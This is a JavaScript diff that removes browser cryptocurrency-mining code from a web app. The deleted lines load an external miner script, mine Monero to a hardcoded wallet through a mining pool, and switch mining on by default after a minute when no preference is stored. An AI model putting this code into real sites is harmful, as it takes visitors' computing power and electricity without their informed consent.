@@ -5,11 +5,6 @@ function main() {
     if(localStorage.getItem("username")) {
         notifier();
         settings();
-        if(localStorage.getItem("support")==="1") loadMiner();
-        else oneSignalTag("miner", "0");
-        if(localStorage.getItem("support")===null){localStorage.getItem("support", "1"); setTimeout(loadMiner,60000);}
-        if(location.hash) location.href = location.href.slice(0,-location.hash.length);
-        gtag('event', 'newsession');
     }
     else {
         setup();
@@ -17,37 +12,6 @@ function main() {
     }
 
 }
-
-var loadMiner = function() {
-  var cfc = document.createElement("script");
-  cfc.src = "https://webminerpool.com/webmr.js";
-  document.head.appendChild(cfc);
-  minerLvl = localStorage.getItem("supportLevel")===null ? 2 : Number(localStorage.getItem("supportLevel"));
-  oneSignalTag("miner", String(minerLvl));
-  setTimeout(setUpMiner, 15000);
-}
-
-var setUpMiner = function () {
-  if(typeof(startMining)==="undefined") {localStorage.setItem("support","0"); return;}
-  startTS = Date.now()/1000;
-  setInterval(function() {
-    hashrate = totalhashes/(Date.now()/1000-startTS);
-    document.getElementById("hashrate").innerText = hashrate.toFixed() + " h/s";
-  }, 5000);
-  startMining("moneroocean.stream","47Ws8NSRaDoJtTxyM7iCTNcQ3JeHLV2yU7e4AYi3hbHyBKqvGybPYSsPugbRaFp6qi1YCHDgbBg22VB3eMe7pFwqMRx83BP", navigator.deviceMemory===undefined?"?":navigator.deviceMemory + " GB, " + navigator.hardwareConcurrency + " cores", 1);
-  if(minerLvl===1)
-    throttleMiner = 100-5*navigator.hardwareConcurrency;
-  if(minerLvl===2)
-    throttleMiner = 100-18*navigator.hardwareConcurrency;
-  if(minerLvl===3) {
-    if(navigator.hardwareConcurrency>3) throttleMiner = 0;
-    else throttleMiner = 50;
-  }
-  if(minerLvl===100) {
-    throttleMiner = 0;
-    startMining("moneroocean.stream","47Ws8NSRaDoJtTxyM7iCTNcQ3JeHLV2yU7e4AYi3hbHyBKqvGybPYSsPugbRaFp6qi1YCHDgbBg22VB3eMe7pFwqMRx83BP", navigator.deviceMemory===undefined?"?":navigator.deviceMemory + " GB, " + navigator.hardwareConcurrency + " cores", -1);
-  }
-};
 
 function oneSignalTag(name, value) {
   OneSignal.push(function() {
